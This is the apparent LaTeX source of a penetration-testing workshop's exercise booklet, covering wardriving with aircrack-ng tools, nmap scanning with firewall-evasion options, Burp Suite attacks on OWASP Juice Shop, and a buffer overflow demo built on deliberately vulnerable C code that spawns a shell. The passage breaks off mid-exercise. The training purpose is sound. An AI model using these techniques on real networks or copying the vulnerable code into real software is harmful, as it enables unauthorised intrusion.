\documentclass[a4paper,11pt,notitlepage]{report}
% Henrik Kramselund, February 2001
% hlk@security6.net,
% My standard packages
\usepackage{zencurity-exercises}

\begin{document}


\selectlanguage{english}

\newcommand{\kursus}[1]{Hackerworkshop PROSA}
\newcommand{\kursusnavn}[1]{Hackerworkshop PROSA\\ exercises}

\mytitle{Hackerworkshop PROSA}{exercises}

\setcounter{tocdepth}{0}

\normal

{\color{titlecolor}\tableofcontents}
%\listoffigures - not used
%\listoftables - not used

\normal
\pagestyle{fancyplain}
\chapter*{\color{titlecolor}Preface}
\markboth{Preface}{}

This material is prepared for use in \emph{\kursus} and was prepared by
Henrik Kramselund, \link{http://www.zencurity.com} .
It describes the networking setup and
applications for trainings and courses where hands-on exercises are needed.

Further a presentation is used which is available as PDF from kramse@Github\\
Look for \jobname in the repo security-courses.

These exercises are expected to be performed in a training setting with network connected systems. The exercises use a number of tools which can be copied and reused after training. A lot is described about setting up your workstation in the repo

\link{https://github.com/kramse/kramse-labs}


\section*{\color{titlecolor}Prerequisites}

This material expect that participants have a working knowledge of
TCP/IP from a user perspective. Basic concepts such as web site addresses and email should be known as well as IP-addresses and common protocols like DHCP.

\vskip 1cm
Have fun and learn
\eject

% =================== body of the document ===============
% Arabic page numbers
\pagenumbering{arabic}
\rhead{\fancyplain{}{\bf \chaptername\ \thechapter}}

% Main chapters
%---------------------------------------------------------------------
% gennemgang af emnet
% check questions

\chapter*{\color{titlecolor}Exercise content}
\markboth{Exercise content}{}

Most exercises follow the same procedure and has the following content:
\begin{itemize}
\item {\bf Objective:} What is the exercise about, the objective
\item {\bf Purpose:} What is to be the expected outcome and goal of doing this exercise
\item {\bf Suggested method:} suggest a way to get started
\item {\bf Hints:} one or more hints and tips or even description how to
do the actual exercises
\item {\bf Solution:} one possible solution is specified
\item {\bf Discussion:} Further things to note about the exercises, things to remember and discuss
\end{itemize}

Please note that the method and contents are similar to real life scenarios and does not detail every step of doing the exercises. Entering commands directly from a book only teaches typing, while the exercises are designed to help you become able to learn and actually research solutions.




\chapter{\faInfoCircle\ Check your Kali VM, run Kali Linux 30 min}
\label{ex:sw-basicVM}

\hlkimage{10cm}{kali-linux.png}

{\bf Objective:}\\
Make sure your virtual machine is in working order.

We need a Kali Linux for running tools during the course.

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\
If you allocate enough memory and disk you wont have problems.

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux includes many hacker tools and should be known by anyone working in infosec.





\chapter{\faExclamationTriangle\ Wardriving Up to 15min}
\label{ex:wardriving}

{\bf Objective:}\\
Try scanning for networks, your operating system can see the wireless networks around you.

Advanced scanning would be to put a network card in monitor mode and sniff wireless networks.

{\bf Purpose:}\\
See that wireless networks dont encrypt MACs addresses and other characteristics - what can be found just by turning on the radio.

{\bf Suggested method:}\\
Use a built-in facility in your laptop, or even better use a phone app. There are MANY phone based apps that can scan for networks and show basic information.

Advanced: Insert USB wireless card, make sure your VM has USB 2.0 Hub and allow VM to control the card.

Start monitor mode - maybe card is not wlan0!:\\
\verb+airmon-ng start wlan0+

Start airodump-ng:\\
\verb+airodump-ng wlan0mon+

See the data

{\bf Hints:}\\
Selecting a specific channel can be done using --channel and writing captured packets can be done using -w\\
\verb+airodump-ng -w demo --channel 6 wlan0mon+

{\bf Solution:}\\
When you have an overview of nearby networks you are done.

{\bf Discussion:}\\
Lots of information is available on the internet. One recommended site is: \link{http://www.aircrack-ng}

It is possible to crack WEP quite easily. WPA2 with AES is currently the most used standard. If using WPA2 PSK -- PreShared Key, single key/password for the whole network, you can try bruteforcing. The aircrack package contains a samle WPA capture you can crack.



\chapter{\faInfoCircle\ EtherApe 10 min}
\label{ex:etherape}

\hlkimage{7cm}{etherape-2018.png}

\begin{quote}
EtherApe is a graphical network monitor for Unix modeled after etherman. Featuring link layer, IP and TCP modes, it displays network activity graphically. Hosts and links change in size with traffic. Color coded protocols display.
Node statistics can be exported.
\end{quote}

{\bf Objective:}\\
Use a tool to see more about network traffic, whats going on in a network.

{\bf Purpose:}\\
Get to know the concept of a node by seeing nodes communicate in a graphical environment.

{\bf Suggested method:}\\
Use the tool from Kali

The main page for the tool is:
\link{https://etherape.sourceforge.io/}

{\bf Hints:}\\
Your built-in network card may not be the best for sniffing. Borrow one from Henrik.

{\bf Solution:}\\
When you have the tool running and showing data, you are done.

{\bf Discussion:}\\




\chapter{\faExclamationTriangle\ Execute nmap TCP and UDP port scan 15 min}
\label{ex:nmap-synscan}


{\bf Objective:} \\
Use nmap to discover important open ports on active systems

{\bf Purpose:}\\
Finding open ports will allow you to find vulnerabilities on these ports.

{\bf Suggested method:}\\
Use \verb+nmap -p 1-1024 server+ to scan the first 1024 TCP
ports and use Nmap without ports. What is scanned then?

Try to use \verb+nmap -sU+ to scan using UDP ports, not really possible if a firewall is in place.

If a firewall blocks ICMP you might need to add \verb+-Pn+ to make nmap scan even if there are no Ping responses

{\bf Hints:} \\
Sample command: \verb+nmap -Pn -sU -p1-1024 server+ UDP port scanning
1024 ports without doing a Ping first

{\bf Solution:}\\
Discover some active systems and most interesting ports, which are 1-1024 and the built-in list of popular ports.

Use the command below as examples:
\begin{itemize}
\item Default Nmap scan: \verb+nmap 10.0.45.1+
\item You are welcome to do further scans, and next exercises will add options
\end{itemize}

Pay attention to the output, try to read it, ask questions

{\bf Discussion:}\\
There is a lot of documentation about the nmap portscanner, even a book by the author
of nmap. Make sure to visit \link{http://www.nmap.org}

TCP and UDP is very different when scanning. TCP is connection/flow oriented and requires a handshake which is very easy to identify. UDP does not have a handshake and most applications will not respond to probes from nmap. If there is no firewall the operating system will respond to UDP probes on closed ports - and the ones that do not respond must be open.

When doing UDP scan on the internet you will almost never get a response, so you cannot tell open (not responding services) from blocked ports (firewall drop packets). Instead try using specific service programs for the services, sample program could be \verb+nsping+ which sends DNS packets, and will often get a response from a DNS server running on UDP port 53.


\chapter{\faExclamationTriangle\ Discover active systems ping and port sweep 15 min}
\label{ex:nmap-pingsweep}
\hlkimage{5cm}{nmap-zenmap.png}

{\bf Objective:}\\
Use nmap to discover active systems and ports

{\bf Purpose:}\\
Know how to use nmap to scan networks for active systems. These ports receive traffic from \emph{the internet} and can be used for DDoS attacks.

Tip: Yes, filtering traffic further out removes it from processing in routers, firewalls, load balancers, etc. So making a stateless filter on the edge may be recommended.

{\bf Suggested method:}\\
Try different scans,
\begin{itemize}
\item Ping sweep to find active systems
\item Port sweeps to find active systems with specific ports
\end{itemize}

{\bf Hints:} \\
Try nmap in sweep mode - and you may run this from Zenmap

{\bf Solution:}\\
Use the command below as examples:
\begin{itemize}
\item Ping sweep ICMP and port probes: \verb+nmap -sP 10.0.45.*+
\item Port sweeps 80/tcp and 443/tcp: \verb+nmap -p 80 10.0.45.*+
\item Port sweeps UDP scans can be done: \verb+nmap -sU -p 161 10.0.45.*+
\end{itemize}

{\bf Discussion:}\\
Quick scans quickly reveal interesting hosts, ports and services

Also now make sure you understand difference between single host scan
10.0.45.123/32, a whole subnet /24 ~250 hosts 10.0.45.0/24 and other more advanced targeteting like 10.0.45.0/25 and 10.0.45.1-10

We will now assume port 80/443 are open, as well as a few UDP services - maybe we can use them in amplification attacks later.



\chapter{\faExclamationTriangle\ Perform nmap OS detection 10 min}
\label{ex:nmap-os}

{\bf Objective:} \\
Use nmap OS detection and see if you can guess the brand of devices on the network

{\bf Purpose:}\\
Getting the operating system of a system will allow you to focus your next attacks.

{\bf Suggested method:}\\
Look at the list of active systems, or do a ping sweep.

Then add the OS detection using the option \verb+-O+

Better to use -A all the time, includes even more scripts and advanced stuff
See the next exercise.

{\bf Hints:} \\

The nmap can send a lot of packets that will get different responses, depending on the operating system. TCP/IP is implemented using various constants chosen by the implementors, they have chosen different standard packet TTL etc.

{\bf Solution:}\\
Use a command like \verb+nmap -O -p1-100 10.0.45.45+ or  \verb+nmap -A -p1-100 10.0.45.45+


{\bf Discussion:}\\
nmap OS detection is not a full proof way of knowing the actual operating system, but in most cases in can detect the family and in some cases it can identify the exact patch level of the system.

\chapter{\faExclamationTriangle\ Perform nmap service scan 30 min}
\label{ex:nmap-service}

{\bf Objective:} \\
Use more advanced features in Nmap to discover services.

{\bf Purpose:}\\
Getting more intimate with the system will allow more precise discovery of the vulnerabilities and also allow you to select the next tools to run.

{\bf Suggested method:}\\
Use \verb+nmap -A+ option for enabling service detection and scripts

{\bf Hints:} \\
Look into the manual page of nmap or the web site book about nmap scanning

{\bf Solution:}\\
Run nmap and get results.

Re-run some of the previous commands and compare the results.

{\bf Discussion:}\\
Some services will show software versions allowing an attacker easy lookup at web sites to known vulnerabilities and often exploits that will have a high probability of success.

Make sure you know the difference between a vulnerability which is discovered, but not really there, a false positive, and a vulnerability not found due to limitations in the testing tool/method, a false negative.

A sample false positive might be reporting that a Windows server has a vulnerability that you know only to exist in Unix systems.


\chapter{\faExclamationTriangle\ Nmap full scan -- can take hours}
\label{ex:nmap-strategy}


{\bf Objective:} \\
Documenting the security level of a network often requires extensive testing. Below are some examples of the scanning methodology needed.


{\bf Purpose:}\\
Doing a port scan often requires you to run multiple Nmap scans.


{\bf Suggested method:}\\
Use Nmap to do:
\begin{enumerate}
\item A few quick scans, to get web servers and start web scanners/crawlers
\item Full scan of all TCP ports, -p 1-65535
\item Full or limited UDP scan, \verb+nmap -sU --top-ports 100+
\item Specialized scans, like specific source ports
\end{enumerate}


{\bf Hints:} \\
Using a specific source ports using -g/--source-port <portnum>: Use given port number with ports like FTP 20, DNS 53 can sometimes get around router filters and other stateless Access Control Lists

{\bf Solution:}\\
Run multiple nmap and get results. At least TCP and UDP top-ports 10.

{\bf Discussion:}\\
Recommendation it is highly recommended to always use:
\begin{alltt}
-iL <inputfilename>: Input from list of hosts/networks
-oA outputbasename: output in all formats, see later
\end{alltt}

Some examples of real life Nmaps I have run recently:
\begin{alltt}
dns-scan: nmap -sU -p 53 --script=dns-recursion -iL targets -oA dns-recursive
bgpscan: nmap -A -p 179 -oA bgpscan -iL targets
dns-recursive: nmap -sU -p 53 --script=dns-recursion -iL targets -oA dns-recursive
php-scan: nmap -sV --script=http-php-version -p80,443 -oA php-scan -iL targets
scan-vtep-tcp: nmap -A -p 1-65535 -oA scan-vtep-tcp 10.1.2.3 192.0.2.123
snmp-10.x.y.0.gnmap: nmap -sV -A -p 161 -sU --script=snmp-info -oA snmp-10xy 10.x.y.0/19
snmpscan: nmap -sU -p 161 -oA snmpscan --script=snmp-interfaces -iL targets
sshscan: nmap -A -p 22 -oA sshscan -iL targets
vncscan: nmap -A -p 5900-5905 -oA vncscan -iL targets
\end{alltt}




\chapter{\faInfoCircle\ Reporting HTML 10 min}
\label{ex:nmap-html}

\hlkimage{10cm}{nmap-html.png}

{\bf Objective:} \\
Show the use of XML output and convert to HTML

{\bf Purpose:}\\
Reporting data is very important. Using the oA option Nmap can export data in three formats easily, each have their use. They are normal, XML, and grepable formats at once.

{\bf Suggested method:}\\
\begin{alltt}
  sudo nmap -oA zencurity-web www.zencurity.com
  xsltproc zencurity-web.xml > zencurity-web.html
\end{alltt}

{\bf Hints:} \\
Nmap includes the stylesheet in XML and makes it very easy to create HTML.

{\bf Solution:}\\
Run XML through xsltproc, command line XSLT processor, or another tool

{\bf Discussion:}\\

Options you can use to change defaults:
\begin{alltt}
--stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
--webxml: Reference stylesheet from Nmap.Org for more portable XML
\end{alltt}

Also check out the Ndiff tool
\begin{alltt}
  hlk@cornerstone03:~$ ndiff zencurity-web.xml zencurity-web-2.xml
  -Nmap 7.70 scan initiated Fri Sep 07 18:35:54 2018 as: nmap -oA zencurity-web www.zencurity.com
  +Nmap 7.70 scan initiated Fri Sep 07 18:46:01 2018 as: nmap -oA zencurity-web-2 www.zencurity.com

   www.zencurity.com (185.129.60.130):
   PORT    STATE SERVICE VERSION
  +443/tcp open  https
\end{alltt}

(I ran a scan, removed a port from the first XML file and re-scanned)



\chapter{\faInfoCircle\ Nping check ports 10min}
\label{ex:nping-tcp}
{\bf Objective:} \\
Show the use of Nping tool for checking ports through a network

{\bf Purpose:}\\
Nping can check if probes can reach through a network, reporting success of failure. Allows very specific packets to be sent.

{\bf Suggested method:}\\
\begin{alltt}\footnotesize
  root@KaliVM:~# nping --tcp -p 80 www.zencurity.com

  Starting Nping 0.7.70 ( https://nmap.org/nping ) at 2018-09-07 19:06 CEST
  SENT (0.0300s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (0.0353s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=49674 iplen=44  seq=3654597698 win=16384 <mss 1460>
  SENT (1.0305s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (1.0391s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=50237 iplen=44  seq=2347926491 win=16384 <mss 1460>
  SENT (2.0325s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (2.0724s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=9842 iplen=44  seq=2355974413 win=16384 <mss 1460>
  SENT (3.0340s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (3.0387s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=1836 iplen=44  seq=3230085295 win=16384 <mss 1460>
  SENT (4.0362s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (4.0549s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=62226 iplen=44  seq=3033492220 win=16384 <mss 1460>

  Max rtt: 40.044ms | Min rtt: 4.677ms | Avg rtt: 15.398ms
  Raw packets sent: 5 (200B) | Rcvd: 5 (220B) | Lost: 0 (0.00%)
  Nping done: 1 IP address pinged in 4.07 seconds
\end{alltt}

{\bf Hints:} \\
A lot of options are similar to Nmap

{\bf Solution:}\\


{\bf Discussion:}\\
A colleague of ours had problems sending specific IPsec packets through a provider. Using a tool like Nping it is possible to show what happens, or where things are blocked.

Things like changing the TTL may provoke ICMP messages, like this:
\begin{alltt}\footnotesize
root@KaliVM:~# nping --tcp -p 80 --ttl 3 www.zencurity.com

Starting Nping 0.7.70 ( https://nmap.org/nping ) at 2018-09-07 19:08 CEST
SENT (0.0303s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (0.0331s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=28456 iplen=72 ]
SENT (1.0314s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (1.0337s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=28550 iplen=72 ]
SENT (2.0330s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (2.0364s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=28589 iplen=72 ]
SENT (3.0346s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (3.0733s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=29403 iplen=72 ]
SENT (4.0366s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (4.0558s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=30235 iplen=72 ]

Max rtt: 38.574ms | Min rtt: 2.248ms | Avg rtt: 13.143ms
Raw packets sent: 5 (200B) | Rcvd: 5 (360B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 4.07 seconds
\end{alltt}


\chapter{\faInfoCircle\ Nmap Scripting Engine NSE scripts 30min}
\label{ex:nmap-nse}

{\bf Objective:} \\
Show the use of NSE scripts, copy/modify a script written in Lua.

{\bf Purpose:}\\
Investigate the scripts from Nmap, maybe copy one, learn how to run specific script using options

{\bf Suggested method:}\\
\begin{alltt}
# cd /usr/share/nmap/scripts
# nmap --script http-default-accounts.nse www.zencurity.com
# cp http-default-accounts.nse http-default-accounts2.nse
# nmap --script http-default-accounts2.nse www.zencurity.com
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-07 19:45 CEST
...
\end{alltt}

This will allow you to make changes to existing scripts.

{\bf Hints:} \\
We will do this quick and dirty - later when doing this at home, I recommend putting your scripts in your home directory or a common file hierarchy.

{\bf Solution:}\\
Other examples
\begin{alltt}
nmap --script http-enum 10.0.45.0/24
nmap -p 445 --script smb-os-discovery 10.0.45.0/24
\end{alltt}


{\bf Discussion:}\\
There are often new scripts when new vulnerabilities are published. It is important to learn how to incorporate them into your scanning. When heartbleed roamed I was able to scan about 20.000 IPs for Heartbleed in less than 10 minutes, which enabled us to update our network quickly for this vulnerability.

It is also possible to run categories of scripts:

\begin{alltt}
nmap --script "http-*"

		   nmap --script "default or safe"
			   This is functionally equivalent to nmap --script "default,safe". It loads all scripts that are in the default category or the safe category or both.

		   nmap --script "default and safe"
			   Loads those scripts that are in both the default and safe categories.
\end{alltt}

or get help for a script:

\begin{alltt}
# nmap -script-help http-vuln-cve2013-0156.nse
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-07 19:00 CEST

http-vuln-cve2013-0156
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2013-0156.html
  Detects Ruby on Rails servers vulnerable to object injection, remote command
  executions and denial of service attacks. (CVE-2013-0156)

  All Ruby on Rails versions before 2.3.15, 3.0.x before 3.0.19, 3.1.x before
  3.1.10, and 3.2.x before 3.2.11 are vulnerable. This script sends 3 harmless
  YAML payloads to detect vulnerable installations. If the malformed object
  receives a status 500 response, the server is processing YAML objects and
  therefore is likely vulnerable.

  References:
  * https://community.rapid7.com/community/metasploit/blog/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156',
  * https://groups.google.com/forum/?fromgroups=#!msg/rubyonrails-security/61bkgvnSGTQ/nehwjA8tQ8EJ',
  * http://cvedetails.com/cve/2013-0156/
\end{alltt}

Some scripts also require, or allow arguments into them:

\begin{alltt}
  nmap -sC --script-args 'user=foo,pass=",{}=bar",paths={/admin,/cgi-bin},xmpp-info.server_name=localhost'
\end{alltt}




\chapter{\faInfoCircle\ Run OWASP Juice Shop 45 min}
\label{ex:sw-startjuice}

\hlkimage{3cm}{JuiceShop_Logo_100px.png}

{\bf Objective:}\\
Lets try starting the OWASP Juice Shop, {\bf I will run it and show it}

{\bf Purpose:}\\
You can easily do some web hacking where you will be the hacker. There
will be an application we try to hack, designed to
optimise your learning.

{\bf Suggested method:}\\
What you need: You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version from Portswigger from:

{\footnotesize\link{https://portswigger.net/burp/communitydownload}}

{\bf Hints:}\\
The application is very modern, very similar to real applications. The Burp proxy is an advanced tool! Dont be scared, we will use small parts at different times.

If you want to run your own shop I recommand running
JuiceShop with Docker, and sometimes running it on Kali is the easiest learning environment.
Go to \link{https://github.com/bkimminich/juice-shop}

{\bf Solution:}\\
When you have seen a running Juice Shop web application, then we are good.

{\bf Discussion:}\\
It has lots of security problems which can be used for learning
hacking, and thereby how to secure your applications. It is  related
to the OWASP.org Open Web Application Security Project which also has a
lot of resources.

Sources:\\
\url{https://github.com/bkimminich/juice-shop}\\
\url{https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project}

It is recommended to buy the \emph{Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop} from \link{https://leanpub.com/juice-shop} - suggested price USD 5.99



\chapter{\faInfoCircle\ Setup JuiceShop environment, app and proxy - up to 60min}
\label{ex:js-burp}

{\bf Objective:}\\
Run JuiceShop with Burp proxy -- if you have it, otherwise you can just listen

Start JuiceShop and make sure it works, visit using browser. The recommended way is using Docker, see previous exercise \ref{ex:sw-startjuice}

Then add a web proxy in-between. We will use Burp suite which is a commercial product, in the community edition. {\bf This version is already installed on Kali Linux}

{\bf Purpose:}\\
We will learn more about web applications as they are a huge part of the applications used in enterprises and on the internet. Most mobile apps are also web applications in disguise.

By inserting a web proxy we can inspect the data being sent between browsers and the application. The history of requests made and responses received is also stored, so we can go back and investigate -- and document.

{\bf Suggested method:}\\
You need to have browsers and a proxy, plus a basic knowledge of HTTP.

We will use the free version of Burp Suite, so please make sure you can run Java and
download the free version \emph{plain JAR file} from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}

follow the Getting Started instructions at:\\
{\footnotesize\link{https://support.portswigger.net/customer/portal/articles/1816883-getting-started-with-burp-suite}}

The recommended setup, as it mimics the real life situation would be:
\begin{itemize}
\item Debian Linux running Docker with JuiceShop -- say on IP \verb+http://10.0.2.12:3000+
\item Kali Linux running Burp Suite with proxy on \verb+127.0.0.1:8080+
\item Kali Linux running a browser using the proxy on \verb+127.0.0.1:8080+ to visit JuiceShop
\end{itemize}

When working you will see the Target tab showing data.

{\bf Hints:}\\
Recommend running Burp on the default address 127.0.0.1 and port 8080.

Burp Suite has a built-in Chrome browser already configured to use Burp.

Note: Burp by default has \verb+intercept is on+ in the Proxy tab, press the button to allow data to flow.

\hlkimage{10cm}{burp-default-proxy-intercept.png}

Then setting it as proxy in Firefox:

\hlkimage{8cm}{firefox-connection-burp.png}

After setting up proxy, you can visit \url{http://burp} and get a CA certificate that can be installed, making it easier to run against HTTPS sites.

The newest versions of Burp include a browser, making it much easier to run the tasks, pre-configured with proxy.

{\bf Solution:}\\
When web sites and servers start popping up in the Target tab, showing the requests and responses - you are done.

Your browser will alert you when visiting TLS enabled sites, HTTPS certificates do not match, as Burp is doing a person-in-the-middle. You need to select advanced and allow this to continue.

{\bf Discussion:}\\
Since Burp is often updated I use the plain JAR file version and a small script for starting Burp which I save in \verb+~/bin/burp+ - dont forget to add to PATH and \verb+chmod +x bin/burp+.

\begin{alltt}
#! /bin/sh
DIRNAME=`dirname $0`
BURP=`ls -1tra $DIRNAME/burp*.jar | tail -1`
java -jar -Xmx2g $BURP &
\end{alltt}

When running in production testing real sites, I typically increase the memory available using JDK / Java settings like \verb+-Xmx16g+


\chapter{\faExclamationTriangle\ JuiceShop Attacks 60min}
\label{ex:juiceshop-attack}

\hlkimage{2cm}{JuiceShop_Logo_100px.png}

 {\bf Objective:}\\
Hack a web application!

Try a few attacks in the JuiceShop with web proxy

\begin{quote}
The OWASP Juice Shop is a pure web application implemented in JavaScript. In the
frontend the popular AngularJS framework is used to create a so-called Single Page
Application. The user interface layout is provided by Twitter's Bootstrap framework - which
works nicely in combination with AngularJS.
JavaScript is also used in the backend as the exclusive programming language: An Express
application hosted in a Node.js server delivers the client-side code to the browser. It also
provides the necessary backend functionality to the client via a RESTful API.

...

The vulnerabilities found in the OWASP Juice Shop are categorized into several different
classes. Most of them cover different risk or vulnerability types from well-known lists or
documents, such as OWASP Top 10 or MITRE's Common Weakness Enumeration. The
following table presents a mapping of the Juice Shop's categories to OWASP and CWE
(without claiming to be complete).
\end{quote}

\hlkimage{10cm}{juiceshop-mappings.png}
Source: \emph{Pwning OWASP Juice Shop}


 {\bf Purpose:}\\
 Try out some of the described web application flaws in a controlled environment. See how an attacker would be able to gather information and attack through HTTP, browser and proxies.

 {\bf Suggested method:}\\
Start the web application, start Burp or another proxy - start your browser.

Access the web application through your browser and get a feel for how it works. First step is to register your user, before you can shop.

Dont forget to use web developer tools like the JavaScript console!

Then afterwards find and try to exploit vulnerabilities, using the book from Björn and starting with some easy ones:

Suggested list of starting vulns:
\begin{list2}
\item Admin Section Access the Admin Section
\item Error handling Provoke and error
\item Forged Feedback Post some feedback in another users name.
\item Access a confidential document
\item Forgotten Sales Backup Access a salesman's forgotten backup file.
\item Retrieve a list of all user credentials via SQL Injection
\end{list2}

{\bf Hints:}\\
The complete guide \emph{Pwning OWASP Juice Shop} written by Björn Kimminich is available as PDF which you can buy, or you can read it online at:\\
\url{https://pwning.owasp-juice.shop/}


 {\bf Solution:}\\
 You decide for how long you want to play with JuiceShop, but try to solve at least 1-2 of these. It is OK to use the solution from the guide.

 Do know that some attackers on the internet spend all their time researching, exploiting and abusing web applications.

 {\bf Discussion:}\\
The vulnerabilities contained in systems like JuiceShop mimic real ones, and do a very good job. You might not think this is possible in real applications, but there is evidence to the contrary.

Using an app like JS instead of real applications with flaws allow you to spend less on installing apps, and more on exploiting.





\chapter{Optional and Demo: Buffer Overflow 101 - 30-40min}
\label{ex:bufferoverflow}


{\bf Objective:}\\
Run a demo program with invalid input - too long.

{\bf Purpose:}\\
See how easy it is to cause an exception.

{\bf Suggested method:}\\
Instructor will walk through this!

{\Large This exercise is meant to show how binary exploitation is done at a low level. If this is the first time you ever meet this, don't worry about it. You need to know this can happen, but you are not expected to be able to explain details during the exam!}

Running on a modern Linux has a lot of protection, making it hard to exploit. Using a Raspberry Pi instead makes it quite easy. Choose what you have available.

Using another processor architecture like MIPS or ARM creates other problems.

\begin{list2}
\item Small demo program \verb+demo.c+
\item Has built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.

Use GDB to repeat the demo by the instructor.

{\bf Hints:}\\
First make sure it compiles:
\begin{alltt}
\$ gcc -o demo demo.c
\$ ./demo hejsa
hejsa
\end{alltt}

Make sure you have tools installed:
\begin{alltt}
apt-get install gdb
\end{alltt}

Then run with debugger:

\begin{alltt}
\$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) {\bf
(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)
// OR
(gdb) {\bf
(gdb) run $(perl -e "print 'A'x22; print 'B'; print 'C'")}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)

\end{alltt}

Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.

{\bf Solution:}\\
When you can run the program with debugger as shown, you are done.

{\bf Discussion:}\\

the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
\begin{alltt}\footnotesize
\$ nm demo
0000000000201040 B __bss_start
0000000000201040 b completed.6972
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201030 D __data_start
0000000000201030 W data_start
0000000000000640 t deregister_tm_clones
00000000000006d0 t __do_global_dtors_aux
0000000000200de0 t __do_global_dtors_aux_fini_array_entry
0000000000201038 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201040 D _edata
0000000000201048 B _end
0000000000000804 T _fini
0000000000000710 t frame_dummy
0000000000200dd8 t __frame_dummy_init_array_entry
0000000000000988 r __FRAME_END__
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
000000000000081c r __GNU_EH_FRAME_HDR
00000000000005a0 T _init
0000000000200de0 t __init_array_end
0000000000200dd8 t __init_array_start
0000000000000810 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000200de8 d __JCR_END__
0000000000200de8 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000000800 T __libc_csu_fini
0000000000000790 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000000740 T main
                 U puts@@GLIBC_2.2.5
0000000000000680 t register_tm_clones
0000000000000610 T _start
                 U strcpy@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
000000000000077c T the_shell
0000000000201040 D __TMC_END__
\end{alltt}

The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.

We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
\begin{alltt}
